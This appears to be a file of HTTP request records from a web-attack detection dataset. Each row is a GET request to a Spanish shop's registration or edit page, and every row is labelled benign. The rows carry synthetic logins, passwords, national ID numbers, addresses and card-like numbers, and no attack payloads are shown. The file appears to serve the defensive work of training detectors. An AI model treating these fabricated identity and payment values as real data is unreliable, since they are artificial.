METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=hekel&password=ennudecer&nombre=Cuniberto&apellidos=Marquine+Olivares&email=topol%40buscadordevideos.td&dni=55702502K&direccion=C%2F+Rositas+80+12%3FA&ciudad=Gerindote&cp=47699&provincia=Vizcaya&ntc=3100489069524720&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=maire&password=Compl7meNt8ria&nombre=Nelio&apellidos=Boneton+Casares&email=ewart_givney%40mauvier.se&dni=64253263A&direccion=Calle+Gonzalez+De+Mendoza+38%2C+&ciudad=Pozoantiguo&cp=08818&provincia=Granada&ntc=0661310331831922&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=emerson&password=entorcarse&nombre=Nara&apellidos=Selles+Baquer%F3&email=debriac.krupka%40perrosmodelo.tz&dni=40865502E&direccion=Paseo+Poeta+Federico+Garcia+Lorca+159%2C+&ciudad=Navalilla&cp=31195&provincia=Salamanca&ntc=2255812100125453&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=salehi&password=cintura&nombre=Ticiano&apellidos=Puch+Kinderman&email=trott%40campodegolf.com.ci&dni=12773567B&direccion=Travessera+Pizarro%2C+164%2C+&ciudad=Cumbres+Mayores&cp=05146&provincia=Zamora&ntc=5592242504094790&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=percival&password=gu%E131ba&nombre=Finees&apellidos=Niub%F3&email=turman-dalkowska%40institutoandaluzdelmar.se&dni=84598781C&direccion=C%2F+David+164+&ciudad=Bellpuig&cp=22591&provincia=Tarragona&ntc=6905475964358006&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=gisele&password=25fam44i8o&nombre=Benigno&apellidos=Arboledas&email=gravet.junior%40ingenieriadelaconstruccion.kg&dni=31517279B&direccion=Pl.+Santa+Teresa+De+Jesus+162%2C+12G&ciudad=Roses&cp=12578&provincia=Vizcaya&ntc=7251909180967020&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=aliza3&password=parroquial&nombre=Dalinda&apellidos=Salvo+Pardos&email=redford2%40enlanzarote.com.cz&dni=51756068L&direccion=Ferrocarril%2C+65+&ciudad=Malpica+de+Berganti%F1os&cp=25639&provincia=C%F3rdoba&ntc=6931236895937120&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=kirkland&password=barand-illa&nombre=Segismundo&apellidos=Moreno+Simonetti&email=tornado%40ringringrent.ph&dni=83974727W&direccion=Manuela+Sancho+3%2C+&ciudad=Albons&cp=03520&provincia=Le%F3n&ntc=4507015616336867&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=friedman&password=p6996raz9&nombre=Her%E1clito&apellidos=Merlos+Umpi%E9rrez&email=strickland%40gestionsoftware.cl&dni=11130412E&direccion=C%2F+Nogal+174+&ciudad=Buenavista+del+Norte&cp=05358&provincia=Zaragoza&ntc=6313115481717860&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=kuswara&password=potajier&nombre=Lucero&apellidos=Sole+Mancisidor&email=calten%40maletti.km&dni=80391645K&direccion=Calle+Argamasilla+111%2C+&ciudad=Rabanera+del+Pinar&cp=19392&provincia=Burgos&ntc=0845804646085451&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=bernie&password=19igra8%ED5&nombre=Lihue&apellidos=Devis+Tud%F3n&email=garvin%40ajuntamentdebcn20.ro&dni=41669222F&direccion=Ernesto+Anastasio+145%2C+&ciudad=Elgoibar&cp=16433&provincia=Valladolid&ntc=5864494451512907&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=babbette&password=su%3Fbduplo&nombre=Olegario&apellidos=Josa+Esteba&email=manjula%40cpanelhost.com.ar&dni=05736398Z&direccion=Calle+Rio+Arauca%2C+97%2C+&ciudad=Ituren&cp=12318&provincia=Valencia&ntc=4102151120364510&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=atique&password=in27stIr&nombre=Francisco&apellidos=Torrens+Lemus&email=littlefeather%40planesypensiones.ar&dni=39703392X&direccion=C%2F+Eustaquio+Villalba%2C+32+2-B&ciudad=Nuevo+Bazt%E1n&cp=32181&provincia=Segovia&ntc=5385221617963613&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=hering&password=Si1_AR&nombre=Sof%EDa&apellidos=Sol%E0s+Cachiner&email=straight%40tobarisch.kz&dni=11103890L&direccion=Calle+Trafalgar+S%2FN%2C+2-C&ciudad=Paredes+de+Sig%FCenza&cp=05416&provincia=Baleares+%28Illes%29&ntc=4602024078447794&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=demers&password=idolOPeyA&nombre=Carminia&apellidos=Comasoli&email=novello%40gia.com.mc&dni=64869388G&direccion=Carrer+Del+Taulat+98+13-G&ciudad=Rioja&cp=47860&provincia=%C1vila&ntc=9413034417926638&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=harwood&password=heinlein&nombre=Rangle&apellidos=Llobera+Crespi&email=manes-neely%40azkara.ps&dni=47745907T&direccion=Calle+Colombia+43+1-G&ciudad=Fortuna&cp=12214&provincia=Salamanca&ntc=9806138617461426&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=murson&password=2a00io40r&nombre=Marceliano&apellidos=Auque+Cote&email=mizner%40hipotecascom.ao&dni=06946719Y&direccion=Calle+Santiago+Dulong%2C+78%2C+&ciudad=Mas+de+Barberans&cp=02652&provincia=Baleares+%28Illes%29&ntc=7538842675878183&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=fidelity&password=A054iN7&nombre=Natale&apellidos=Berttony&email=hagan%40ceramicasmi%F1o.am&dni=92652474X&direccion=Calle+Sevilla+115+&ciudad=Herb%E9s&cp=16390&provincia=Lleida&ntc=2291483228211842&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=dambenie&password=temedor&nombre=Felicia&apellidos=Peleij%E0+Marcapura&email=linkletter.eudal%40koinup.km&dni=85022782Q&direccion=Oriana+67+&ciudad=Tahal&cp=10883&provincia=C%E1diz&ntc=8611196070656706&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=schwenk&password=3usc1&nombre=Irene&apellidos=Lorente&email=ramo%40whitehat.py&dni=56479820P&direccion=Pl.+De+La+Coru%F1a+166+&ciudad=Monleras&cp=16464&provincia=Le%F3n&ntc=2669670300165135&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=thia&password=candeledana&nombre=Merl%EDn&apellidos=Tapias&email=kirksey9%40reidesa.li&dni=25026163R&direccion=C%2F+Oeste+41+&ciudad=Muro+de+Alcoy&cp=33070&provincia=C%E1ceres&ntc=7457334236490109&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=trivedi9&password=2ef02i1do&nombre=Feladelfa&apellidos=Munsec+Peirat%F3&email=ferreol%40azkara.sa&dni=69115661V&direccion=Plza.+Riofrio+145%2C+12-H&ciudad=Villablanca&cp=45600&provincia=Teruel&ntc=3632404786575006&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=mereu&password=mAgneTIzar&nombre=Sylvina&apellidos=Garrig%F3s+Gomis&email=lonza%40deuxmanagement.fr&dni=15074727K&direccion=Grupo+Partida+Plana+S%2FN+1%3FC&ciudad=Pontils&cp=19415&provincia=Le%F3n&ntc=3246974816793870&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=clouthie&password=de2p34illa8o&nombre=Royce&apellidos=Mu%F1uzuri&email=koscina%40theroxyblue.is&dni=06590539G&direccion=Ciscar%2C+90%2C+&ciudad=Coles&cp=22770&provincia=Segovia&ntc=5591838639353736&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=afton&password=aCeNEfa&nombre=Gladys&apellidos=Munera+Feijoo&email=viscuso%40sexl.la&dni=53936401K&direccion=C%2F+Los+Peregrinos+10+&ciudad=Fuentestr%FAn&cp=17133&provincia=Alicante&ntc=3059187424121383&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=muhammed&password=s58ri66ro&nombre=Anacleto&apellidos=Isal&email=rainer%40citiway.za&dni=08145876N&direccion=Avda.+Santa+Marina%2C+150+&ciudad=Marl%EDn&cp=09183&provincia=C%E1ceres&ntc=8168207865875882&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=lander&password=compr8n%3Fder&nombre=Gianfranco&apellidos=Yebra+Lores&email=baskett%40turinga.mu&dni=62680220E&direccion=Passeig+Independencia%2C+57+3%3FE&ciudad=Hu%E9rcanos&cp=21870&provincia=Almer%EDa&ntc=0129438518463582&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=timmins&password=se8vil70ta&nombre=Visitaci%F3n&apellidos=Del+Valle+Mieses&email=passeri-tavaroli%40joyclub.th&dni=27246887Y&direccion=Calle+Osa+Mayor+S%2FN%2C+4-G&ciudad=Carballeda+de+Valdeorras&cp=03787&provincia=%C1vila&ntc=3297829070173901&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=milloy&password=9pagable&nombre=Fortunata&apellidos=Vera&email=letizia-qirjaqi2%40estaestuweb.com.ai&dni=68747644T&direccion=Calle+Manchado+160+&ciudad=Masdenverge&cp=45685&provincia=Valladolid&ntc=6576458089577961&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=khue&password=ENCostRar&nombre=Renzo&apellidos=Yevenes+Alapont&email=pelling%40cup-id.mz&dni=48773946P&direccion=Andikoetxe+150+&ciudad=Molezuelas+de+la+Carballeda&cp=40389&provincia=Soria&ntc=0138591223810471&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=kuivinen&password=e0capazAr&nombre=Hernaldo&apellidos=Lupiano+Morgades&email=gomes_burke%40capitalinvest.es&dni=94697154J&direccion=Calle+Mossen+Salvador%2C+29%2C+&ciudad=Tubilla+del+Lago&cp=45880&provincia=%C1vila&ntc=9770856347671410&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=se&password=UNo&nombre=Aroldo&apellidos=La+Serna+Ripa&email=silvain%40addl.yu&dni=04185564R&direccion=C%2F+San+Agustin+S%2FN+&ciudad=Zarza-Capilla&cp=44001&provincia=Cuenca&ntc=6002195366442297&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=marriet&password=def0n470n&nombre=Celinda&apellidos=Cucurull+Forn&email=emhardt%40lasiestacreativa.td&dni=67550162J&direccion=C%2F+Jose+Luis+De+Ugarte%2C+30+13%3FC&ciudad=Villar+de+Rena&cp=30730&provincia=Asturias&ntc=6051231794859112&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=kizzee&password=malojal&nombre=Remigio&apellidos=Lizama+Vielmas&email=lundy%40academiaversal.pm&dni=90471972T&direccion=C%2F+Prado%2C+132+&ciudad=Dos+Hermanas&cp=48192&provincia=Cuenca&ntc=1286497435313401&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=sheikna&password=per76%21raci%F3n&nombre=Lavina&apellidos=Fortin+Susanibar&email=danson%40whitehat.dd&dni=12823124A&direccion=Talavera+S%2FN+&ciudad=Yeles&cp=40194&provincia=Burgos&ntc=8201185179055303&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=schutte&password=hu7a&nombre=Serapio&apellidos=Barrionuevo+Burunat&email=lune-dulier%40natravea.py&dni=72824002E&direccion=C%2F+Puerta+De+Murcia+90+12%3FF&ciudad=Boss%F2st&cp=17462&provincia=C%E1ceres&ntc=7261809327587258&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=raglin&password=racionalidad&nombre=Babeli&apellidos=Gamarro&email=hershey.byrne%40devuelos.pf&dni=50312119X&direccion=C%2F+Ingeniero+Jose+Bosch+y+Sintes+172+&ciudad=Valdege%F1a&cp=24210&provincia=Zaragoza&ntc=3610612400416764&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=tarver&password=mitayo&nombre=Luis+Gonzaga&apellidos=Padrosa+Acho&email=laage%40am-si.tl&dni=43503793Y&direccion=Calle+Valencia+160+1-F&ciudad=Jafre&cp=09143&provincia=Salamanca&ntc=0576591607001043&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=mckinney&password=visitadora&nombre=Betsabeth&apellidos=Qui%F1ones+Ascu%ED&email=hamshire_kell%40santcugatpisos.sj&dni=67400685J&direccion=C%2F+Can+Malla+79+6%3FF&ciudad=Ezcabarte&cp=21870&provincia=Madrid&ntc=1169278790190247&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=medel8&password=4u36a5&nombre=Yodalia&apellidos=Vich+Bov%E9&email=rhett%40guiapolicial.yu&dni=25301830J&direccion=C%2F+Parque+Residencial+Ruben+Dario%2C+50+&ciudad=Valfarta&cp=46669&provincia=Palencia&ntc=0649770357645683&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=maneatis4&password=pa3d0039i4o&nombre=Lamec&apellidos=Laconich+Fraga&email=clugston%40restaurantepicopico.bo&dni=76195343T&direccion=Calle+Bartolome+Ordo%F1ez+74+&ciudad=Tejado&cp=05690&provincia=Girona&ntc=3295070876764042&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=hsiao-ch&password=088a4c42o&nombre=Valdemar&apellidos=Aylagas&email=fuerbringer%40andropit.se&dni=91954319C&direccion=C%2F+Matias+Turrion%2C+42+&ciudad=Bu%F1uel&cp=48120&provincia=Girona&ntc=2401503379678987&B1=Registrar PROTOCOL=HTTP/1.1,benign
